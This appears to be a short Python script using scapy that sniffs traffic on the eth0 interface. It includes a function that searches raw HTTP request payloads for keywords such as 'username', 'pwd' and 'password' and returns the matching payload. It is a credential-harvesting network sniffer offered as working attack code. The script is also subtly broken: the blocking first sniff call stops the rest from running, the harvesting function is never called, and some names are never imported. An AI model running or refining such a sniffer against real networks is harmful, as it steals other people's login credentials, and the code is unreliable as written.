from scapy.all import *

def packet_callback(packet):
    print(packet.show())

# sniff packets on the eth0 interface
sniff(iface="eth0", prn=packet_callback, store=0)

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
            for eachword in keybword:
                if eachword.encode() in load:
                    return load
                
sniff('eth0')                
